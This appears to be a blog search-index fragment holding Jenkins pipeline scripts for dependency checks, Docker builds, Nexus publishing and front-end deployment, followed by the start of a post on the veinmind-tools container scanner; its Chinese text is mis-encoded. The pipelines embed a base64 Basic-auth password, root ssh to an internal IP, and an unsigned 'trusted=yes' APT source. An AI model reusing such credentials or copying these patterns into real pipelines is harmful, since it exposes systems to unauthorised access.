File(&quot;$WORKSPACE&#x2F;target&#x2F;bom.json&quot;).text\n                    def slurper &#x3D; new JsonSlurper()\n                    def states &#x3D; slurper.parseText(jsonPayload)\n                    def components &#x3D; states.components\n                    def checks &#x3D; [&#39;org.apache.shiro:shiro-spring&#39;:&#39;1.9.1&#39;]\n                    def fail_components &#x3D; &quot;&quot;\n                    for (component in components)&#123;\n                        def dep_name &#x3D; component.group + &quot;:&quot; + component.name\n                        \n                        if (dep_name in checks)&#123;\n                            current_version &#x3D; component.version\n                            \n                            check_version &#x3D; checks.get(dep_name)\n                            String[] current_version_chars &#x3D; current_version.split(&#39;\\\\.&#39;)\n                            String[] check_version_chars &#x3D; check_version.split(&#39;\\\\.&#39;)\n                            \n                            \n                            for(int i&#x3D;0; i&lt;current_version_chars.size(); i++)&#123;\n                                curr &#x3D; Integer.parseInt(current_version_chars[i])\n                                check &#x3D; Integer.parseInt(check_version_chars[i])\n                                if (curr &lt; check)&#123;\n                                    fail_components +&#x3D; component.group + &quot;:&quot; + component.name + &quot;ç‰ˆæœ¬è¿‡ä½ï¼Œå½“å‰ç‰ˆæœ¬ä¸ºï¼š&quot; + component.version + &quot;ï¼Œåº”ä¸ä½äº&quot; + check_version + &quot;\\n&quot;\n                                    break\n                                &#125;\n                            &#125;\n                        &#125;\n                        \n                    &#125;\n                    if(fail_components !&#x3D; &quot;&quot;)&#123;\n                        println(fail_components)\n                        mvn dependency:tree\n                        error &quot;å®‰å…¨åˆè§„æ£€æŸ¥å¤±è´¥ï¼Œè¯·å‡çº§ç‰ˆæœ¬ï¼ï¼ï¼&quot;\n                    &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n    &#125;\n\n&#125;\n\nDCimport hudson.model.*;\nimport hudson.*\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        maven &#39;maven-apollo&#39;\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n    \n    stages &#123;\n        stage(&#39;åˆ é™¤ä¸Šæ¬¡æ„å»º&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*&#39;\n\n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;service_name&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;æ‹‰å–ä»£ç &#39;)&#123;\n            steps &#123;\n                echo &#39;ä»£ç åˆ†æ”¯:&#39;+BRANCH\n                echo &#39;ä»£ç åœ°å€:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n           \n            &#125;\n        &#125;\n        \n        stage(&#39;build&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    \n                &#39;&#39;&#39;\n            &#125;\n        &#125;\n        \n        \n        stage(&#39;Dependency-Check åˆ†æ&#39;)&#123;\n            steps &#123;\n               sh &#39;&#39;&#39;\n               alias dependency-check&#x3D;&#39;sh &#x2F;data&#x2F;dependency-check&#x2F;dependency-check&#x2F;bin&#x2F;dependency-check.sh&#39;\n\n               dependency-check -n -s $&#123;WORKSPACE&#125;&#x2F; --format HTML --format XML  -o .&#x2F; \n               &#39;&#39;&#39;\n           \n            &#125;\n        &#125;\n        \n        stage(&#39;å‘å¸ƒ Dependency-Check ç»“æœ&#39;)&#123;\n            steps &#123;\n               dependencyCheckPublisher pattern: &#39;dependency-check-report.xml&#39;\n           \n            &#125;\n        &#125;\n        \n        stage(&#39;å‘å¸ƒHTML&#39;)&#123;\n            steps &#123;\n               publishHTML (target : [allowMissing: false,\n               alwaysLinkToLastBuild: false,\n               keepAll: true,\n               reportDir: workspace,\n               reportFiles: &#39;dependency-check-report.html&#39;,\n               reportName: &#39;ä¾èµ–æ£€æµ‹æŠ¥å‘Š&#39;,\n               reportTitles: &#39;OWASP Report&#39;])\n           \n            &#125;\n        &#125;\n        \n    &#125;\n\n&#125;\n\nmaven buildimport hudson.model.*;\nimport hudson.*\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        maven &#39;maven-apollo&#39;\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n        &#x2F;&#x2F; nodejs &#39;node&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;åˆ é™¤ä¸Šæ¬¡æ„å»º&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*&#39;\n                &#x2F;&#x2F; sh &#39;docker images&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;BUILD_ID&#125;-$&#123;service_name&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;æ‹‰å–ä»£ç &#39;)&#123;\n            steps &#123;\n                echo &#39;ä»£ç åˆ†æ”¯:&#39;+BRANCH\n                echo &#39;ä»£ç åœ°å€:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n              \n            &#125;\n        &#125;\n\n        stage(&#39;ymlæ–‡ä»¶æ ¡éªŒ&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    if (!service_name.contains(&quot;apollo&quot;))&#123;\n                        sh &#39;&#39;&#39;\n                           \n                            isExist&#x3D;&#96;find . -name application-*.yml&#96;\n                            if [ -z $isExist ]; then\n                                echo &quot;ymlæ–‡ä»¶æ ¡éªŒé€šè¿‡&quot;\n                            else\n                                echo &quot;ymlæ–‡ä»¶æ ¡éªŒä¸é€šè¿‡ï¼Œå­˜åœ¨å‘½åä¸º $isExist çš„æ–‡ä»¶ï¼Œå¯èƒ½ä¼šå¼•èµ·ç”Ÿäº§é—®é¢˜ï¼Œè¯·è”ç³»å¼€å‘åˆ é™¤&quot;\n                                exit 2\n                            fi\n                            &#39;&#39;&#39;\n                    &#125;\n                &#125;\n                \n            &#125;            \n        &#125;\n\n        \n        stage(&#39;éªŒè¯ DOCKER_IMAGE é•¿åº¦&#39;)&#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    if [[ $&#123;#DOCKER_IMAGE&#125; -gt 28 ]];then\n                        echo &quot;é•œåƒåç§°é•¿åº¦ä¸èƒ½è¶…è¿‡28ï¼ï¼ï¼ï¼ä¿®æ”¹åå†æ¥å§ï¼&quot;\n                        exit 2\n                    fi\n                    &#39;&#39;&#39;\n            &#125;\n        &#125;\n        \n        stage(&#39;apolloé…ç½®æ ¡éªŒ&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    sh &#39;&#39;&#39;\n                        updatedb\n                        bootstrapList&#x3D;&#96;locate bootstrap | grep $WORKSPACE&#39;&#x2F;&#39;&#96;\n                        for bootstrap in $bootstrapList\n                            do\n                                cat $bootstrap | while read line\n                                    do\n                                        echo $line\n                                        str&#x3D;$&#123;line##*( )&#125;\n                                        echo $str\n                                        if [[ $str &#x3D;&#x3D; config-service* ]];then\n                                            echo &quot;$bootstrap æ–‡ä»¶æ£€æŸ¥å¤±è´¥ï¼Œè¯·å°†apollo.configserviceä¿®æ”¹ä¸ºapollo.meta!!! &quot;\n                                            exit 2\n                                        fi\n\n                                    done\n                            done\n                    &#39;&#39;&#39;\n                &#125;\n                \n            &#125;            \n        &#125;\n        \n        \n        stage(&#39;Dockerfileé•œåƒæºæ£€æŸ¥&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    if [[ $POM_PATH &#x3D;&#x3D; &#39;pom.xml&#39; ]];then\n                        updatedb\n                        dockerfiles&#x3D;&#96;locate Dockerfile | grep -v target | grep $WORKSPACE&#39;&#x2F;&#39;&#96;\n                    else\n                        dir&#x3D;$&#123;POM_PATH%&#x2F;*&#125;\n                        echo $dir\n                        dockerfiles&#x3D;&#96;locate Dockerfile | grep -v target | grep $WORKSPACE&#39;&#x2F;&#39; | grep $dir&#96;\n                    fi\n                    \n                    for dockerfile in $dockerfiles\n                        do\n                            cat $dockerfile | while read line\n                                do\n                                    echo $line\n                                    str&#x3D;$&#123;line##*( )&#125;\n                                    echo $str\n                                    if [[ $str &#x3D;~ ^FROM ]];then\n                                        if [[ !( $str &#x3D;~ &#39;&#x2F;&#39; ) ]] || [[ !( $str &#x3D;~ &#39;registry.moses.com&#39; ) ]];then\n                                            echo &quot;Dockerfile æ²¡æœ‰æŒ‡å®šé•œåƒæº&quot;\n                                            exit 2\n                                        else\n                                            exit 0\n                                           \n                                        fi\n                                    fi\n                                done\n                        done\n                &#39;&#39;&#39;\n            &#125;\n        &#125;\n\n\n        stage(&#39;mavenSnapshotCheck&#39;)&#123;\n            steps &#123;\n                \n                sh &#39;&#39;&#39;\n                    echo &quot;è·å–ç™½åå•åˆ—è¡¨......&quot;\n                    white_services&#x3D;(&quot;hcfc-slam-entrust-web-v2&quot; &quot;hcfc-slam-entrust-soa&quot; &quot;credit-tencent&quot; &quot;lam-quota-soa&quot; &quot;credit-cloud&quot; &quot;credit-face&quot; &quot;hcfc-lam-web-v2&quot; &quot;hcfc-lam-cm-soa&quot; &quot;hcfc-lam-cm-web&quot; &quot;jdgp&quot; &quot;hcfc-lam-core-web&quot; &quot;hcfc-lam-core-soa&quot; &quot;hcfc-antifraud-auto&quot; &quot;hcfc-antifraud-soa&quot; &quot;hcfc-antifraud-web&quot; &quot;hcfc-auditor-auto&quot; &quot;hcfc-auditor-soa&quot; &quot;hcfc-auditor-web&quot; &quot;hcfc-roster-soa&quot; &quot;hcfc-jdgp-server&quot; &quot;id-generator&quot;)\n\n                    echo &quot;æ£€æŸ¥ä¾èµ–é¡¹......&quot;\n                    \n                    dependency&#x3D;&#96;mvn dependency:list | grep -i snapshot| grep INFO|grep com.hcfc|awk &#39;&#123;print $2&#125;&#39;&#96;\n\n                    if ( [[ $&#123;#dependency&#125; -gt 0 ]] &amp;&amp; [[ ! (&quot;$&#123;white_services[@]&#125;&quot; &#x3D;~ &quot;$&#123;service_name&#125;&quot;) ]] );then\n\n                            echo &quot;ä¾èµ–æ£€æŸ¥å¤±è´¥ï¼Œè¯·è”ç³»ç ”å‘ä¿®æ”¹ï¼ï¼ï¼&quot;\n                            exit 2\n                    else\n                        echo &quot;ä¾èµ–æ£€æŸ¥é€šè¿‡ï¼ï¼ï¼&quot;\n                    fi \n\n                    echo &quot;ä¾èµ–æ£€æŸ¥ç»“æŸ......&quot;\n\n                    &#39;&#39;&#39;\n            &#125;\n\n        &#125;\n\n        &#x2F;&#x2F; stage(&#39;mavenSnapshotCheck&#39;) &#123;\n        &#x2F;&#x2F;     steps &#123;\n        &#x2F;&#x2F;         mavenSnapshotCheck check: true\n                \n        &#x2F;&#x2F;     &#125;\n        &#x2F;&#x2F; &#125;\n\n\n        stage(&#39;build&#39;) &#123;\n         steps &#123;\n                sh &#39;&#39;&#39;\n                    mvn clean install -e -U -DskipDockerPush -DdockerImageTags&#x3D;latest -Dmaven.test.skip&#x3D;true $mvn_params -f pom.xml\n                    if [[ $copy_to_remote_server &#x3D;&#x3D; &quot;true&quot; ]];then\n                        updatedb\n                        jar_path&#x3D;&#96;locate $service_name&quot;.jar&quot;| grep &quot;$WORKSPACE&quot;|grep docker|awk &#39;NR&#x3D;&#x3D;1&#123;print&#125;&#39;&#96;\n                        current&#x3D;$(date &quot;+%Y%m%d%H%M%S&quot;)\n                        ssh root@10.1.80.10 &quot;mkdir -p &#x2F;data&#x2F;guangfudai&#x2F;$service_name&#x2F;$current&quot;\n\t                    scp -r $jar_path &quot;root@10.1.80.10:&#x2F;data&#x2F;guangfudai&#x2F;$service_name&#x2F;$current&#x2F;&quot;\n                    fi\n                   # docker images\n                    \n                &#39;&#39;&#39;\n             &#125;\n         &#125;\n\n        stage(&#39;tag&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    \n\n                    if [[ &quot;$&#123;BRANCH&#125;&quot; &#x3D; &#39;master&#39; ]];then\n                    \n                        global_version&#x3D;&#96;cat pom.xml| grep revision|wc -l&#96;\n                    \n    \n                        if [[ $global_version -gt 0 ]];then\n                            POM_VERSION&#x3D;&#96;mvn -Dexec.executable&#x3D;&#39;echo&#39; -Dexec.args&#x3D;&#39;$&#123;project.version&#125;&#39; --non-recursive exec:exec -q -f pom.xml&#96;\n                        else\n                            POM_VERSION&#x3D;&#96;mvn -Dexec.executable&#x3D;&#39;echo&#39; -Dexec.args&#x3D;&#39;$&#123;project.version&#125;&#39; --non-recursive exec:exec -q -f $POM_PATH&#96;\n    \n                        fi\n                        \n                        VERSION&#x3D;&quot;$POM_VERSION&quot;\n                    else\n                        VERSION&#x3D;&quot;$&#123;BRANCH&#125;.$&#123;BUILD_ID&#125;&quot;\n                    fi\n                    echo &quot;Version:$VERSION&quot;\n                    echo &quot;#&#123;DOCKER_IMAGE&#125;&#x3D;$VERSION&quot; &gt; micro-service.version\n                    \n                    if [[ $POM_DOCKER_IMAGE &#x3D;~ &quot;:&quot; ]];then\n                        sub&#x3D;$&#123;POM_DOCKER_IMAGE##*:&#125;\n                        if [[ $sub &#x3D;~ &quot;&#x2F;&quot; ]];then\n                            echo $POM_DOCKER_IMAGE\n                        else\n                            VERSION&#x3D;$&#123;POM_DOCKER_IMAGE##*:&#125;\n                            POM_DOCKER_IMAGE&#x3D;$&#123;POM_DOCKER_IMAGE%%:*&#125;\n                        fi\n                    fi\n                    \n                    image&#x3D;&#96;&#x2F;usr&#x2F;bin&#x2F;docker images| grep &quot;latest&quot;|awk &#39;&#123;print $1&#125;&#39;|grep &quot;$POM_DOCKER_IMAGE$&quot;|wc -l&#96;\n                    \n\n                    if [[ $image -ne 0 ]];then\n                            &#x2F;usr&#x2F;bin&#x2F;docker tag  $POM_DOCKER_IMAGE:latest $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$VERSION\n\n                            if [[ &quot;$&#123;BRANCH&#125;&quot; &#x3D; &quot;master&quot; ]]; then\n                                &#x2F;usr&#x2F;bin&#x2F;docker tag $POM_DOCKER_IMAGE:latest  $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:latest\n                                &#x2F;usr&#x2F;bin&#x2F;docker tag $POM_DOCKER_IMAGE:latest $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$&#123;BRANCH&#125;.$&#123;BUILD_ID&#125;\n                                &#x2F;usr&#x2F;bin&#x2F;docker push $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$&#123;BRANCH&#125;.$&#123;BUILD_ID&#125;\n                                &#x2F;usr&#x2F;bin&#x2F;docker push $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:latest\n                            fi\n\n                            &#x2F;usr&#x2F;bin&#x2F;docker push $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$VERSION\n\n                            echo &quot;&#x2F;usr&#x2F;bin&#x2F;docker image: $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:$VERSION&quot;\n                            echo &quot;&#x2F;usr&#x2F;bin&#x2F;docker image: $ENV_DOCKER_REGISTRY_HOST&#x2F;$DOCKER_IMAGE:latest&quot;\n                    else\n                            echo &quot;é•œåƒæ‰“åŒ…å¤±è´¥ï¼Œè¯·æ£€æŸ¥ å‰é¢æµç¨‹å¤±è´¥æˆ–è€…POM_DOCKER_IMAGEä¸ç ”å‘ä»£ç ä¸­çš„ä¸åŒ¹é…&quot;\n\n                    fi\n                    echo &quot;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;ä»¥ä¸‹è¯·å¿½ç•¥&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&#x3D;&quot;\n                &#39;&#39;&#39;\n\n            &#125;\n        &#125;\n        \n        stage(&#39;clean no use images å¿½ç•¥æ­¤æ­¥éª¤&#39;) &#123;\n         steps &#123;\n             \n             sh &#39;&#39;&#39;\n                if [[ $POM_DOCKER_IMAGE &#x3D;~ &quot;:&quot; ]];then\n                    POM_DOCKER_IMAGE&#x3D;$&#123;POM_DOCKER_IMAGE%%:*&#125;\n                fi\n                &#x2F;usr&#x2F;bin&#x2F;docker rmi $(&#x2F;usr&#x2F;bin&#x2F;docker images | grep -w $POM_DOCKER_IMAGE | awk -F &#39; &#39; &#39;&#123;print $1&quot;:&quot;$2&#125;&#39;)\n                &#x2F;usr&#x2F;bin&#x2F;docker rmi $(&#x2F;usr&#x2F;bin&#x2F;docker images | grep -w $DOCKER_IMAGE | awk -F &#39; &#39; &#39;&#123;print $1&quot;:&quot;$2&#125;&#39;)\n            &#39;&#39;&#39;\n                \n            &#125;\n         &#125;\n        \n    &#125;\n\n&#125;\n\npush images to registry Nexusimport hudson.model.*;\nimport hudson.*\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        &#x2F;&#x2F; maven &#39;maven&#39;\n        maven &#39;maven-apollo&#39;\n        git &#39;Default&#39;\n        jdk &#39;jdk&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;åˆ é™¤ä¸Šæ¬¡æ„å»º&#39; )&#123;\n            steps &#123;\n               \n                sh &#39;rm -rf *&#39;\n                sh &#39;rm -rf &#x2F;data&#x2F;maven&#x2F;localRepository3.8.1&#x2F;com&#x2F;hcfc&#x2F;*&#39;\n                sh &#39;docker images&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                  script&#123;\n                      buildName &quot;#$&#123;BUILD_ID&#125;-$&#123;dir_names&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n                  &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;æ‹‰å–ä»£ç &#39;)&#123;\n            steps &#123;\n                echo &#39;ä»£ç åˆ†æ”¯:&#39;+BRANCH\n                echo &#39;ä»£ç åœ°å€:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n                \n            &#125;\n        &#125;\n\n        stage(&#39;æ¨é€jaråŒ…&#39;)&#123;\n            steps &#123;\n                script&#123;\n                    \n                    sh &#39;&#39;&#39;\n                        dirs&#x3D;$&#123;dir_names&#x2F;&#x2F;,&#x2F; &#125;\n                        for dir in $&#123;dirs[@]&#125;\n                        do\n                            package_version&#x3D;&#96;mvn -Dexec.executable&#x3D;echo &#39;-Dexec.args&#x3D;$&#123;project.version&#125;&#39; --non-recursive exec:exec -q -f $dir&#x2F;pom.xml&#96;\n                            package_name&#x3D;&#96;mvn -Dexec.executable&#x3D;echo &#39;-Dexec.args&#x3D;$&#123;project.artifactId&#125;&#39; --non-recursive exec:exec -q -f $dir&#x2F;pom.xml&#96;\n                            url&#x3D;&#39;http:&#x2F;&#x2F;maven.moses.com&#x2F;service&#x2F;rest&#x2F;v1&#x2F;search?group&#x3D;com.hcfc&amp;name&#x3D;&#39;$package_name&#39;&amp;version&#x3D;&#39;$package_version\n                            \n                            curl -X GET $url -H &#39;Authorization: Basic dGVzdGplbmtpbnM6MzEybzZ6V0VOUGpvWmlWS3FHaWQ&#x3D;&#39; &gt; response_json\n                            items&#x3D;&#96;jq .items response_json&#96;\n                            \n                            if [[ $items !&#x3D; &#39;&#39; &amp;&amp; $items !&#x3D; [] ]];then\n                                echo &quot;ç‰ˆæœ¬å·²å­˜åœ¨ &quot;\n                            fi\n                        done\n                    \n                        \n                        if [[ $dir_names &#x3D;&#x3D; &quot;&quot; ]];then\n                            mvn clean deploy $mvn_params -DskipDockerPush -DskipTests\n                        else\n                            mvn clean deploy -pl $dir_names $mvn_params -DskipDockerPush -DskipTests\n                        fi\n                        &#39;&#39;&#39;\n                &#125;\n                \n            &#125;\n        &#125;\n    &#125;\n\n&#125;\nå‰ç«¯é¡¹ç›®æ‰“åŒ…import hudson.model.*;\n\npipeline &#123;\n    agent any\n\n    tools &#123;\n        git &#39;Default&#39;\n        nodejs &#39;node-13&#39;\n\n    &#125;\n         \n    stages &#123;\n        stage(&#39;åˆ é™¤ä¸Šæ¬¡æ„å»º&#39; )&#123;\n            steps &#123;\n                sh &#39;rm -rf *&#39;\n                \n                wrap([$class: &#39;BuildUser&#39;]) &#123;\n                  \n                   script&#123;\n                       buildName &quot;#$&#123;service_name&#125;-$&#123;BRANCH&#125;-$&#123;env.BUILD_USER&#125;&quot;   \n\n                   &#125;\n                &#125;\n            &#125;\n        &#125;\n        \n        stage(&#39;æ‹‰å–ä»£ç &#39;)&#123;\n            steps &#123;\n                echo &#39;ä»£ç åˆ†æ”¯:&#39;+BRANCH\n                echo &#39;ä»£ç åœ°å€:&#39; +GIT_URL\n                git branch: BRANCH, credentialsId: &#39;0eeb53a0-0390-41a4-9ac2-8d4c4c5c884f&#39;, url: GIT_URL\n            &#125;\n        &#125;\n        \n        stage(&#39;å®‰è£…npm&#39;)&#123;\n            steps &#123;\n                script &#123;\n                    sh  &#39;&#39;&#39;\n                        cnpm install\n                        git submodule init \n                        git submodule update\n                    &#39;&#39;&#39;\n                &#125;\n            &#125;\n        &#125;\n\n        stage(&#39;build&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    export CI&#x3D;false\n                    npm run build$&#123;ENVIRONMENT&#125;\n                &#39;&#39;&#39;\n            &#125;\n        &#125;\n         \n        stage(&#39;deploy&#39;) &#123;\n            steps &#123;\n                sh &#39;&#39;&#39;\n                    cd $BUILD_DIR\n                    ssh $SSH_AGENT_ACCOUNT@$SSH_AGENT_IP &quot;cd $SSH_AGENT_PATH&#x2F;$DOMAIN&#x2F;$DIR &amp;&amp; rm -rf *&quot;\n                    scp -r * $SSH_AGENT_ACCOUNT@$SSH_AGENT_IP:$SSH_AGENT_PATH&#x2F;$DOMAIN&#x2F;$DIR\n                    ssh $SSH_AGENT_ACCOUNT@$SSH_AGENT_IP &quot;cd $SSH_AGENT_PATH&#x2F;$DOMAIN&#x2F;$DIR &amp;&amp; zip -r $&#123;service_name&#125;.moses.com.zip .&#x2F;*&quot;\n                &#39;&#39;&#39;\n            &#125;\n        &#125;               \n\n    &#125;\n\n&#125;","slug":"Jenkins pipeline","date":"2022-09-14T02:13:00.000Z","categories_index":"è½¯ä»¶ä¾›åº”é“¾å®‰å…¨","tags_index":"CI/CD,SCA,Jenkins","author_index":"Moses"},{"id":"3675872e04aa6948518b5c79b3c5c1a2","title":"å®¹å™¨é•œåƒå®‰å…¨å·¥å…·-Veinmind-tools","content":"\n\n\n\n\n\n\n\n\nå·¥å…·çš„é“ä¸æœ¯ï¼šé“ï¼Œæ˜¯æŒ‡è¿™ä¸ªå·¥å…·å†…åœ¨çš„å“²å­¦ï¼Œå¦‚æœä½ è§‰å¾—å“²å­¦è¿™ä¸ªè¯å¤ªå¤§äº†ï¼Œä¹Ÿå¯ä»¥å«å®ƒé€»è¾‘ã€‚ä¸€ä¸ªå·¥å…·çš„ä¼˜é›…ä¹‹å¤„å°±ä½“ç°åœ¨ã€Œé“ã€ä¸Šï¼Œã€Œé“ã€è™½ç„¶è²Œä¼¼è™šæ— ç¼¥ç¼ˆï¼Œå®ƒå´æ˜¯æœ€å®¹æ˜“åŒºåˆ†åŒç±»å‹å·¥å…·ä¹‹é—´ä¸åŒä¹‹å¤„çš„ä¸œè¥¿ã€‚æœ¯ï¼Œå°±æ˜¯æŠ€æœ¯å±‚é¢ï¼Œè¿™ä¸ªå·¥å…·æ€ä¹ˆæ“ä½œï¼Œæ€ä¹ˆç”¨èµ·æ¥ã€‚\nveinmind-tools0x01ç®€ä»‹veinmind-toolsæ˜¯ç”±é•¿äº­ç§‘æŠ€è‡ªç ”ï¼ŒåŸºäºÂ veinmind-sdkÂ æ‰“é€ çš„å®¹å™¨å®‰å…¨å·¥å…·é›†\n0x02æ¶æ„å›¾ç•¥\n0x03æ ¸å¿ƒèƒ½åŠ›\n\n\nå·¥å…·\nåŠŸèƒ½\n\n\n\nveinmind-runner\næ‰«æå·¥å…·è¿è¡Œå®¿ä¸»\n\n\nveinmind-malicious\næ‰«æé•œåƒä¸­çš„æ¶æ„æ–‡ä»¶\n\n\nveinmind-weakpass\næ‰«æé•œåƒä¸­çš„å¼±å£ä»¤\n\n\nveinmind-sensitive\næ‰«æé•œåƒä¸­çš„æ•æ„Ÿä¿¡æ¯\n\n\nveinmind-backdoor\næ‰«æé•œåƒä¸­çš„åé—¨\n\n\nveinmind-history\næ‰«æé•œåƒä¸­çš„å¼‚å¸¸å†å²å‘½ä»¤\n\n\nveinmind-asset\næ‰«æé•œåƒä¸­çš„èµ„äº§ä¿¡æ¯\n\n\nveinmind-webshell\næ‰«æé•œåƒä¸­çš„ Webshell\n\n\n0x04äº‘åŸç”Ÿå…¼å®¹æ€§\n\n\nåç§°\nç±»åˆ«\næ˜¯å¦å…¼å®¹\n\n\n\nJenkins\nCI&#x2F;CD\nâœ”ï¸\n\n\nGitlab CI\nCI&#x2F;CD\nâœ”ï¸\n\n\nGithub Action\nCI&#x2F;CD\nâœ”ï¸\n\n\nDockerHub\né•œåƒä»“åº“\nâœ”ï¸\n\n\nDocker Registry\né•œåƒä»“åº“\nâœ”ï¸\n\n\nHarbor\né•œåƒä»“åº“\nâœ”ï¸\n\n\nDocker\nå®¹å™¨è¿è¡Œæ—¶\nâœ”ï¸\n\n\nContainerd\nå®¹å™¨è¿è¡Œæ—¶\nâœ”ï¸\n\n\n0x05Quickstartrequireå®‰è£…docker\ninstallå®‰è£…é•œåƒ\ndocker pull veinmind&#x2F;veinmind-runner:latest\nä¸‹è½½Â veinmind-runnerÂ å¹³è¡Œå®¹å™¨å¯åŠ¨è„šæœ¬\nwget -q https:&#x2F;&#x2F;download.veinmind.tech&#x2F;scripts&#x2F;veinmind-runner-parallel-container-run.sh -O run.sh &amp;&amp; chmod +x run.sh\nå¿«é€Ÿæ‰«ææœ¬åœ°é•œåƒ\n.&#x2F;run.sh scan-host\n0x06libVeinMindlibveinmindä¸€ä¸ªç”±é•¿äº­è‡ªç ”ï¼Œç›´è§‚è€Œå¯æ‰©å±•çš„å®¹å™¨å®‰å…¨ SDK\nquick startä¸€èˆ¬æƒ…å†µä¸‹ï¼Œåº”ç”¨åº”ä»¥å¹³è¡Œå®¹å™¨çš„æ–¹å¼å‘å¸ƒå’Œéƒ¨ç½²ï¼Œç”¨æˆ·æ— éœ€é¢å¤–å®‰è£…ä¾èµ–ã€‚å¦‚ä½•ä»¥å¹³è¡Œå®¹å™¨æ–¹å¼æ„å»ºä¸å‘å¸ƒåº”ç”¨ï¼Œè¯¦è§å¹³è¡Œå®¹å™¨è¯´æ˜æ–‡æ¡£ã€‚\nè‹¥åº”ç”¨åªæ”¯æŒæœ¬åœ°è¿è¡Œï¼Œæˆ–éœ€è¦æ­å»ºæœ¬åœ°ç¯å¢ƒè¿›è¡Œå¼€å‘ï¼Œåˆ™éœ€è¦å…ˆå®‰è£…å¯¹åº”å¹³å°ä¸‹çš„é—®è„‰ SDK è½¯ä»¶åŒ…ã€‚\nè½¯ä»¶å®‰è£…åŒ…å…ƒä¿¡æ¯ä¸­åŒ…å«é—®è„‰ SDK çš„ç›¸å…³è®¸å¯åè®®ï¼Œåœ¨å¼€å‘å’Œä½¿ç”¨æ—¶è¯·éµå®ˆè®¸å¯åè®®ã€‚å½“æ‚¨ä¸‹è½½å¹¶å®‰è£… SDK è½¯ä»¶åŒ…åå³è§†ä¸ºæ‚¨å·²åŒæ„é—®è„‰ SDK ä½¿ç”¨åè®®ã€‚\nåœ¨ Ubuntu å’Œ Debian å¹³å°ä¸‹ï¼Œæ·»åŠ é—®è„‰ SDK çš„ APT ä»“åº“å³å¯å®‰è£…æ‰€éœ€è½¯ä»¶åŒ…ï¼š\necho &#39;deb [trusted&#x3D;yes] https:&#x2F;&#x2F;download.veinmind.tech&#x2F;libveinmind&#x2F;apt&#x2F; .&#x2F;&#39; | sudo tee &#x2F;etc&#x2F;apt&#x2F;sources.list.d&#x2F;libveinmind.list\nsudo apt-get update\nsudo apt-get install libveinmind-dev\nåœ¨ RedHat å’Œ CentOS 